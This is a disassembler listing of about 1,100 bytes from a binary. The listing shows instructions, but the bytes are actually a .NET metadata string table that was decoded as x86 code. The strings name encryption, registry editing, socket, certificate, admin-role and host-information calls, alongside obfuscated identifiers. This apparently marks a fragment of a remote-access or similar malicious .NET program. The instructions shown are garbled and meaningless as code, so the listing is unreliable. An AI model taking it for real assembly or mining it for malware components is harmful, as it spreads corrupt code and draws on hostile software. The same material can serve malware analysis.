  40850b:	72 44                	jb     0x408551
  40850d:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408511:	4d                   	dec    %ebp
  408512:	6f                   	outsl  %ds:(%esi),(%dx)
  408513:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  408518:	79 70                	jns    0x40858a
  40851a:	74 6f                	je     0x40858b
  40851c:	53                   	push   %ebx
  40851d:	74 72                	je     0x408591
  40851f:	65 61                	gs popa
  408521:	6d                   	insl   (%dx),%es:(%edi)
  408522:	4d                   	dec    %ebp
  408523:	6f                   	outsl  %ds:(%esi),(%dx)
  408524:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  408529:	6d                   	insl   (%dx),%es:(%edi)
  40852a:	70 72                	jo     0x40859e
  40852c:	65 73 73             	gs jae 0x4085a2
  40852f:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  408536:	00 43 69             	add    %al,0x69(%ebx)
  408539:	70 68                	jo     0x4085a3
  40853b:	65 72 4d             	gs jb  0x40858b
  40853e:	6f                   	outsl  %ds:(%esi),(%dx)
  40853f:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  408544:	6c                   	insb   (%dx),%es:(%edi)
  408545:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  40854a:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  408550:	65 74 65             	gs je  0x4085b8
  408553:	53                   	push   %ebx
  408554:	75 62                	jne    0x4085b8
  408556:	4b                   	dec    %ebx
  408557:	65 79 54             	gs jns 0x4085ae
  40855a:	72 65                	jb     0x4085c1
  40855c:	65 00 59 6d          	add    %bl,%gs:0x6d(%ecx)
  408560:	74 67                	je     0x4085c9
  408562:	69 67 52 4e 6c 50 62 	imul   $0x62506c4e,0x52(%edi),%esp
  408569:	64 66 65 00 67 65    	fs data16 add %ah,%gs:0x65(%edi)
  40856f:	74 5f                	je     0x4085d0
  408571:	4d                   	dec    %ebp
  408572:	65 73 73             	gs jae 0x4085e8
  408575:	61                   	popa
  408576:	67 65 00 5a 51       	add    %bl,%gs:0x51(%bp,%si)
  40857b:	64 58                	fs pop %eax
  40857d:	4f                   	dec    %edi
  40857e:	6d                   	insl   (%dx),%es:(%edi)
  40857f:	48                   	dec    %eax
  408580:	74 53                	je     0x4085d5
  408582:	58                   	pop    %eax
  408583:	75 67                	jne    0x4085ec
  408585:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  408589:	76 6f                	jbe    0x4085fa
  40858b:	6b 65 00 52          	imul   $0x52,0x0(%ebp),%esp
  40858f:	45                   	inc    %ebp
  408590:	43                   	inc    %ebx
  408591:	7a 4b                	jp     0x4085de
  408593:	59                   	pop    %ecx
  408594:	52                   	push   %edx
  408595:	41                   	inc    %ecx
  408596:	5a                   	pop    %edx
  408597:	6c                   	insb   (%dx),%es:(%edi)
  408598:	65 00 49 45          	add    %cl,%gs:0x45(%ecx)
  40859c:	6e                   	outsb  %ds:(%esi),(%dx)
  40859d:	75 6d                	jne    0x40860c
  40859f:	65 72 61             	gs jb  0x408603
  4085a2:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  4085a6:	49                   	dec    %ecx
  4085a7:	44                   	inc    %esp
  4085a8:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  4085af:	6c                   	insb   (%dx),%es:(%edi)
  4085b0:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  4085b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4085b6:	75 62                	jne    0x40861a
  4085b8:	6c                   	insb   (%dx),%es:(%edi)
  4085b9:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4085bd:	74 5f                	je     0x40861e
  4085bf:	48                   	dec    %eax
  4085c0:	61                   	popa
  4085c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c2:	64 6c                	fs insb (%dx),%es:(%edi)
  4085c4:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4085c9:	74 69                	je     0x408634
  4085cb:	6d                   	insl   (%dx),%es:(%edi)
  4085cc:	65 46                	gs inc %esi
  4085ce:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  4085d5:	64 6c                	fs insb (%dx),%es:(%edi)
  4085d7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085db:	74 4d                	je     0x40862a
  4085dd:	6f                   	outsl  %ds:(%esi),(%dx)
  4085de:	64 75 6c             	fs jne 0x40864d
  4085e1:	65 48                	gs dec %eax
  4085e3:	61                   	popa
  4085e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4085e5:	64 6c                	fs insb (%dx),%es:(%edi)
  4085e7:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  4085eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4085ec:	74 69                	je     0x408657
  4085ee:	6d                   	insl   (%dx),%es:(%edi)
  4085ef:	65 54                	gs push %esp
  4085f1:	79 70                	jns    0x408663
  4085f3:	65 48                	gs dec %eax
  4085f5:	61                   	popa
  4085f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4085f7:	64 6c                	fs insb (%dx),%es:(%edi)
  4085f9:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4085fd:	74 54                	je     0x408653
  4085ff:	79 70                	jns    0x408671
  408601:	65 46                	gs inc %esi
  408603:	72 6f                	jb     0x408674
  408605:	6d                   	insl   (%dx),%es:(%edi)
  408606:	48                   	dec    %eax
  408607:	61                   	popa
  408608:	6e                   	outsb  %ds:(%esi),(%dx)
  408609:	64 6c                	fs insb (%dx),%es:(%edi)
  40860b:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  40860f:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408616:	65 
  408617:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  40861b:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  408622:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408629:	6e 
  40862a:	52                   	push   %edx
  40862b:	6f                   	outsl  %ds:(%esi),(%dx)
  40862c:	6c                   	insb   (%dx),%es:(%edi)
  40862d:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  408631:	6e                   	outsb  %ds:(%esi),(%dx)
  408632:	64 6f                	outsl  %fs:(%esi),(%dx)
  408634:	77 73                	ja     0x4086a9
  408636:	42                   	inc    %edx
  408637:	75 69                	jne    0x4086a2
  408639:	6c                   	insb   (%dx),%es:(%edi)
  40863a:	74 49                	je     0x408685
  40863c:	6e                   	outsb  %ds:(%esi),(%dx)
  40863d:	52                   	push   %edx
  40863e:	6f                   	outsl  %ds:(%esi),(%dx)
  40863f:	6c                   	insb   (%dx),%es:(%edi)
  408640:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408644:	74 5f                	je     0x4086a5
  408646:	4d                   	dec    %ebp
  408647:	61                   	popa
  408648:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  40864f:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408653:	6f                   	outsl  %ds:(%esi),(%dx)
  408654:	63 65 73             	arpl   %esp,0x73(%ebp)
  408657:	73 4d                	jae    0x4086a6
  408659:	6f                   	outsl  %ds:(%esi),(%dx)
  40865a:	64 75 6c             	fs jne 0x4086c9
  40865d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408661:	74 5f                	je     0x4086c2
  408663:	57                   	push   %edi
  408664:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40866b:	79 6c                	jns    0x4086d9
  40866d:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408671:	6f                   	outsl  %ds:(%esi),(%dx)
  408672:	63 65 73             	arpl   %esp,0x73(%ebp)
  408675:	73 57                	jae    0x4086ce
  408677:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40867e:	79 6c                	jns    0x4086ec
  408680:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408684:	74 5f                	je     0x4086e5
  408686:	4e                   	dec    %esi
  408687:	61                   	popa
  408688:	6d                   	insl   (%dx),%es:(%edi)
  408689:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40868d:	74 5f                	je     0x4086ee
  40868f:	46                   	inc    %esi
  408690:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408697:	00 
  408698:	73 65                	jae    0x4086ff
  40869a:	74 5f                	je     0x4086fb
  40869c:	46                   	inc    %esi
  40869d:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086a4:	00 
  4086a5:	47                   	inc    %edi
  4086a6:	65 74 54             	gs je  0x4086fd
  4086a9:	65 6d                	gs insl (%dx),%es:(%edi)
  4086ab:	70 46                	jo     0x4086f3
  4086ad:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086b4:	00 
  4086b5:	47                   	inc    %edi
  4086b6:	65 74 46             	gs je  0x4086ff
  4086b9:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4086c0:	00 
  4086c1:	67 65 74 5f          	addr16 gs je 0x408724
  4086c5:	4d                   	dec    %ebp
  4086c6:	61                   	popa
  4086c7:	63 68 69             	arpl   %ebp,0x69(%eax)
  4086ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4086cb:	65 4e                	gs dec %esi
  4086cd:	61                   	popa
  4086ce:	6d                   	insl   (%dx),%es:(%edi)
  4086cf:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086d3:	74 5f                	je     0x408734
  4086d5:	4f                   	dec    %edi
  4086d6:	53                   	push   %ebx
  4086d7:	46                   	inc    %esi
  4086d8:	75 6c                	jne    0x408746
  4086da:	6c                   	insb   (%dx),%es:(%edi)
  4086db:	4e                   	dec    %esi
  4086dc:	61                   	popa
  4086dd:	6d                   	insl   (%dx),%es:(%edi)
  4086de:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086e2:	74 5f                	je     0x408743
  4086e4:	46                   	inc    %esi
  4086e5:	75 6c                	jne    0x408753
  4086e7:	6c                   	insb   (%dx),%es:(%edi)
  4086e8:	4e                   	dec    %esi
  4086e9:	61                   	popa
  4086ea:	6d                   	insl   (%dx),%es:(%edi)
  4086eb:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4086ef:	74 5f                	je     0x408750
  4086f1:	55                   	push   %ebp
  4086f2:	73 65                	jae    0x408759
  4086f4:	72 4e                	jb     0x408744
  4086f6:	61                   	popa
  4086f7:	6d                   	insl   (%dx),%es:(%edi)
  4086f8:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  4086fc:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408700:	6f                   	outsl  %ds:(%esi),(%dx)
  408701:	73 74                	jae    0x408777
  408703:	4e                   	dec    %esi
  408704:	61                   	popa
  408705:	6d                   	insl   (%dx),%es:(%edi)
  408706:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  40870b:	65 54                	gs push %esp
  40870d:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  408714:	5f                   	pop    %edi
  408715:	4c                   	dec    %esp
  408716:	61                   	popa
  408717:	73 74                	jae    0x40878d
  408719:	57                   	push   %edi
  40871a:	72 69                	jb     0x408785
  40871c:	74 65                	je     0x408783
  40871e:	54                   	push   %esp
  40871f:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  408726:	6e                   	outsb  %ds:(%esi),(%dx)
  408727:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  40872e:	54                   	push   %esp
  40872f:	69 6d 65 00 44 61 77 	imul   $0x77614400,0x65(%ebp),%ebp
  408736:	71 53                	jno    0x40878b
  408738:	65 67 65 44          	gs addr16 gs inc %esp
  40873c:	6e                   	outsb  %ds:(%esi),(%dx)
  40873d:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  408741:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  408748:	00 
  408749:	43                   	inc    %ebx
  40874a:	6f                   	outsl  %ds:(%esi),(%dx)
  40874b:	6d                   	insl   (%dx),%es:(%edi)
  40874c:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40874f:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408753:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  40875a:	6d                   	insl   (%dx),%es:(%edi)
  40875b:	65 54                	gs push %esp
  40875d:	79 70                	jns    0x4087cf
  40875f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408763:	74 5f                	je     0x4087c4
  408765:	56                   	push   %esi
  408766:	61                   	popa
  408767:	6c                   	insb   (%dx),%es:(%edi)
  408768:	75 65                	jne    0x4087cf
  40876a:	54                   	push   %esp
  40876b:	79 70                	jns    0x4087dd
  40876d:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408771:	6f                   	outsl  %ds:(%esi),(%dx)
  408772:	74 6f                	je     0x4087e3
  408774:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  408777:	54                   	push   %esp
  408778:	79 70                	jns    0x4087ea
  40877a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40877e:	74 54                	je     0x4087d4
  408780:	79 70                	jns    0x4087f2
  408782:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  408786:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  408789:	74 54                	je     0x4087df
  40878b:	79 70                	jns    0x4087fd
  40878d:	65 00 62 73          	add    %ah,%gs:0x73(%edx)
  408791:	62 54 4f 74          	bound  %edx,0x74(%edi,%ecx,2)
  408795:	5a                   	pop    %edx
  408796:	41                   	inc    %ecx
  408797:	43                   	inc    %ebx
  408798:	71 65                	jno    0x4087ff
  40879a:	00 46 69             	add    %al,0x69(%esi)
  40879d:	6c                   	insb   (%dx),%es:(%edi)
  40879e:	65 53                	gs push %ebx
  4087a0:	68 61 72 65 00       	push   $0x657261
  4087a5:	53                   	push   %ebx
  4087a6:	79 73                	jns    0x40881b
  4087a8:	74 65                	je     0x40880f
  4087aa:	6d                   	insl   (%dx),%es:(%edi)
  4087ab:	2e 43                	cs inc %ebx
  4087ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ae:	72 65                	jb     0x408815
  4087b0:	00 77 49             	add    %dh,0x49(%edi)
  4087b3:	7a 52                	jp     0x408807
  4087b5:	4d                   	dec    %ebp
  4087b6:	70 42                	jo     0x4087fa
  4087b8:	6c                   	insb   (%dx),%es:(%edi)
  4087b9:	77 57                	ja     0x408812
  4087bb:	49                   	dec    %ecx
  4087bc:	76 6d                	jbe    0x40882b
  4087be:	73 65                	jae    0x408825
  4087c0:	00 43 6c             	add    %al,0x6c(%ebx)
  4087c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4087c4:	73 65                	jae    0x40882b
  4087c6:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4087ca:	70 6f                	jo     0x40883b
  4087cc:	73 65                	jae    0x408833
  4087ce:	00 50 61             	add    %dl,0x61(%eax)
  4087d1:	72 73                	jb     0x408846
  4087d3:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  4087d7:	72 52                	jb     0x40882b
  4087d9:	65 76 65             	gs jbe 0x408841
  4087dc:	72 73                	jb     0x408851
  4087de:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  4087e2:	30 39                	xor    %bh,(%ecx)
  4087e4:	43                   	inc    %ebx
  4087e5:	65 72 74             	gs jb  0x40885c
  4087e8:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4087ef:	00 43 72             	add    %al,0x72(%ebx)
  4087f2:	65 61                	gs popa
  4087f4:	74 65                	je     0x40885b
  4087f6:	00 53 65             	add    %dl,0x65(%ebx)
  4087f9:	74 54                	je     0x40884f
  4087fb:	68 72 65 61 64       	push   $0x64616572
  408800:	45                   	inc    %ebp
  408801:	78 65                	js     0x408868
  408803:	63 75 74             	arpl   %esi,0x74(%ebp)
  408806:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40880d:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  408812:	65 74 65             	gs je  0x40887a
  408815:	00 43 61             	add    %al,0x61(%ebx)
  408818:	6c                   	insb   (%dx),%es:(%edi)
  408819:	6c                   	insb   (%dx),%es:(%edi)
  40881a:	53                   	push   %ebx
  40881b:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408822:	74 
  408823:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408827:	6d                   	insl   (%dx),%es:(%edi)
  408828:	70 69                	jo     0x408893
  40882a:	6c                   	insb   (%dx),%es:(%edi)
  40882b:	65 72 47             	gs jb  0x408875
  40882e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408830:	65 72 61             	gs jb  0x408894
  408833:	74 65                	je     0x40889a
  408835:	64 41                	fs inc %ecx
  408837:	74 74                	je     0x4088ad
  408839:	72 69                	jb     0x4088a4
  40883b:	62 75 74             	bound  %esi,0x74(%ebp)
  40883e:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408843:	75 67                	jne    0x4088ac
  408845:	67 61                	addr16 popa
  408847:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40884b:	74 74                	je     0x4088c1
  40884d:	72 69                	jb     0x4088b8
  40884f:	62 75 74             	bound  %esi,0x74(%ebp)
  408852:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408856:	6d                   	insl   (%dx),%es:(%edi)
  408857:	56                   	push   %esi
  408858:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40885f:	74 74                	je     0x4088d5
  408861:	72 69                	jb     0x4088cc
  408863:	62 75 74             	bound  %esi,0x74(%ebp)
  408866:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40886a:	73 65                	jae    0x4088d1
  40886c:	6d                   	insl   (%dx),%es:(%edi)
  40886d:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408871:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408878:	72 
  408879:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408880:	73 73                	jae    0x4088f5
  408882:	65 6d                	gs insl (%dx),%es:(%edi)
  408884:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408888:	72 61                	jb     0x4088eb
  40888a:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40888d:	61                   	popa
  40888e:	72 6b                	jb     0x4088fb
  408890:	41                   	inc    %ecx
  408891:	74 74                	je     0x408907
  408893:	72 69                	jb     0x4088fe
  408895:	62 75 74             	bound  %esi,0x74(%ebp)
  408898:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40889d:	67 65 74 46          	addr16 gs je 0x4088e7
  4088a1:	72 61                	jb     0x408904
  4088a3:	6d                   	insl   (%dx),%es:(%edi)
  4088a4:	65 77 6f             	gs ja  0x408916
  4088a7:	72 6b                	jb     0x408914
  4088a9:	41                   	inc    %ecx
  4088aa:	74 74                	je     0x408920
  4088ac:	72 69                	jb     0x408917
  4088ae:	62 75 74             	bound  %esi,0x74(%ebp)
  4088b1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088b5:	73 65                	jae    0x40891c
  4088b7:	6d                   	insl   (%dx),%es:(%edi)
  4088b8:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4088bc:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4088c3:	69 
  4088c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088c5:	6e                   	outsb  %ds:(%esi),(%dx)
  4088c6:	41                   	inc    %ecx
  4088c7:	74 74                	je     0x40893d
  4088c9:	72 69                	jb     0x408934
  4088cb:	62 75 74             	bound  %esi,0x74(%ebp)
  4088ce:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088d2:	73 65                	jae    0x408939
  4088d4:	6d                   	insl   (%dx),%es:(%edi)
  4088d5:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4088d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4088da:	6e                   	outsb  %ds:(%esi),(%dx)
  4088db:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4088e1:	74 69                	je     0x40894c
  4088e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e5:	41                   	inc    %ecx
  4088e6:	74 74                	je     0x40895c
  4088e8:	72 69                	jb     0x408953
  4088ea:	62 75 74             	bound  %esi,0x74(%ebp)
  4088ed:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4088f1:	73 65                	jae    0x408958
  4088f3:	6d                   	insl   (%dx),%es:(%edi)
  4088f4:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4088f8:	65 73 63             	gs jae 0x40895e
  4088fb:	72 69                	jb     0x408966
  4088fd:	70 74                	jo     0x408973
  4088ff:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  408906:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  40890d:	65 66 61             	gs popaw
  408910:	75 6c                	jne    0x40897e
  408912:	74 4d                	je     0x408961
  408914:	65 6d                	gs insl (%dx),%es:(%edi)
  408916:	62 65 72             	bound  %esp,0x72(%ebp)
  408919:	41                   	inc    %ecx
  40891a:	74 74                	je     0x408990
  40891c:	72 69                	jb     0x408987
  40891e:	62 75 74             	bound  %esi,0x74(%ebp)
  408921:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408925:	6d                   	insl   (%dx),%es:(%edi)
  408926:	70 69                	jo     0x408991
  408928:	6c                   	insb   (%dx),%es:(%edi)
  408929:	61                   	popa
  40892a:	74 69                	je     0x408995
  40892c:	6f                   	outsl  %ds:(%esi),(%dx)
  40892d:	6e                   	outsb  %ds:(%esi),(%dx)
  40892e:	52                   	push   %edx
  40892f:	65 6c                	gs insb (%dx),%es:(%edi)
  408931:	61                   	popa
  408932:	78 61                	js     0x408995
  408934:	74 69                	je     0x40899f
  408936:	6f                   	outsl  %ds:(%esi),(%dx)
  408937:	6e                   	outsb  %ds:(%esi),(%dx)
  408938:	73 41                	jae    0x40897b
  40893a:	74 74                	je     0x4089b0
  40893c:	72 69                	jb     0x4089a7
  40893e:	62 75 74             	bound  %esi,0x74(%ebp)
  408941:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408945:	73 65                	jae    0x4089ac
  408947:	6d                   	insl   (%dx),%es:(%edi)
  408948:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  40894c:	72 6f                	jb     0x4089bd
  40894e:	64 75 63             	fs jne 0x4089b4
  408951:	74 41                	je     0x408994
  408953:	74 74                	je     0x4089c9
  408955:	72 69                	jb     0x4089c0
  408957:	62 75 74             	bound  %esi,0x74(%ebp)
  40895a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40895e:	73 65                	jae    0x4089c5
  408960:	6d                   	insl   (%dx),%es:(%edi)
  408961:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408965:	6f                   	outsl  %ds:(%esi),(%dx)
  408966:	70 79                	jo     0x4089e1
  408968:	72 69                	jb     0x4089d3
  40896a:	67 68 74 41 74 74    	addr16 push $0x74744174
  408970:	72 69                	jb     0x4089db
  408972:	62 75 74             	bound  %esi,0x74(%ebp)
  408975:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408979:	73 65                	jae    0x4089e0
  40897b:	6d                   	insl   (%dx),%es:(%edi)
  40897c:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408980:	6f                   	outsl  %ds:(%esi),(%dx)
  408981:	6d                   	insl   (%dx),%es:(%edi)
  408982:	70 61                	jo     0x4089e5
  408984:	6e                   	outsb  %ds:(%esi),(%dx)
  408985:	79 41                	jns    0x4089c8
  408987:	74 74                	je     0x4089fd
  408989:	72 69                	jb     0x4089f4
  40898b:	62 75 74             	bound  %esi,0x74(%ebp)
  40898e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408992:	6e                   	outsb  %ds:(%esi),(%dx)
  408993:	74 69                	je     0x4089fe
  408995:	6d                   	insl   (%dx),%es:(%edi)
  408996:	65 43                	gs inc %ebx
  408998:	6f                   	outsl  %ds:(%esi),(%dx)
  408999:	6d                   	insl   (%dx),%es:(%edi)
  40899a:	70 61                	jo     0x4089fd
  40899c:	74 69                	je     0x408a07
  40899e:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4089a1:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4089a8:	69 
  4089a9:	62 75 74             	bound  %esi,0x74(%ebp)
  4089ac:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4089b0:	74 5f                	je     0x408a11
  4089b2:	55                   	push   %ebp
  4089b3:	73 65                	jae    0x408a1a
  4089b5:	53                   	push   %ebx
  4089b6:	68 65 6c 6c 45       	push   $0x456c6c65
  4089bb:	78 65                	js     0x408a22
  4089bd:	63 75 74             	arpl   %esi,0x74(%ebp)
  4089c0:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4089c4:	61                   	popa
  4089c5:	64 42                	fs inc %edx
  4089c7:	79 74                	jns    0x408a3d
  4089c9:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4089cd:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4089d4:	00 
  4089d5:	44                   	inc    %esp
  4089d6:	65 6c                	gs insb (%dx),%es:(%edi)
  4089d8:	65 74 65             	gs je  0x408a40
  4089db:	56                   	push   %esi
  4089dc:	61                   	popa
  4089dd:	6c                   	insb   (%dx),%es:(%edi)
  4089de:	75 65                	jne    0x408a45
  4089e0:	00 47 65             	add    %al,0x65(%edi)
  4089e3:	74 56                	je     0x408a3b
  4089e5:	61                   	popa
  4089e6:	6c                   	insb   (%dx),%es:(%edi)
  4089e7:	75 65                	jne    0x408a4e
  4089e9:	00 53 65             	add    %dl,0x65(%ebx)
  4089ec:	74 56                	je     0x408a44
  4089ee:	61                   	popa
  4089ef:	6c                   	insb   (%dx),%es:(%edi)
  4089f0:	75 65                	jne    0x408a57
  4089f2:	00 67 65             	add    %ah,0x65(%edi)
  4089f5:	74 5f                	je     0x408a56
  4089f7:	4b                   	dec    %ebx
  4089f8:	65 65 70 41          	gs gs jo 0x408a3d
  4089fc:	6c                   	insb   (%dx),%es:(%edi)
  4089fd:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  408a04:	5f                   	pop    %edi
  408a05:	4b                   	dec    %ebx
  408a06:	65 65 70 41          	gs gs jo 0x408a4b
  408a0a:	6c                   	insb   (%dx),%es:(%edi)
  408a0b:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  408a12:	6f                   	outsl  %ds:(%esi),(%dx)
  408a13:	76 65                	jbe    0x408a7a
  408a15:	00 73 65             	add    %dh,0x65(%ebx)
  408a18:	74 5f                	je     0x408a79
  408a1a:	42                   	inc    %edx
  408a1b:	6c                   	insb   (%dx),%es:(%edi)
  408a1c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408a20:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a27:	5f                   	pop    %edi
  408a28:	54                   	push   %esp
  408a29:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2a:	74 61                	je     0x408a8d
  408a2c:	6c                   	insb   (%dx),%es:(%edi)
  408a2d:	53                   	push   %ebx
  408a2e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408a35:	5f                   	pop    %edi
  408a36:	48                   	dec    %eax
  408a37:	65 61                	gs popa
  408a39:	64 65 72 53          	fs gs jb 0x408a90
  408a3d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a44:	5f                   	pop    %edi
  408a45:	48                   	dec    %eax
  408a46:	65 61                	gs popa
  408a48:	64 65 72 53          	fs gs jb 0x408a9f
  408a4c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a53:	5f                   	pop    %edi
  408a54:	53                   	push   %ebx
  408a55:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a57:	64 42                	fs inc %edx
  408a59:	75 66                	jne    0x408ac1
  408a5b:	66 65 72 53          	data16 gs jb 0x408ab2
  408a5f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408a66:	5f                   	pop    %edi
  408a67:	52                   	push   %edx
  408a68:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408a6c:	76 65                	jbe    0x408ad3
  408a6e:	42                   	inc    %edx
  408a6f:	75 66                	jne    0x408ad7
  408a71:	66 65 72 53          	data16 gs jb 0x408ac8
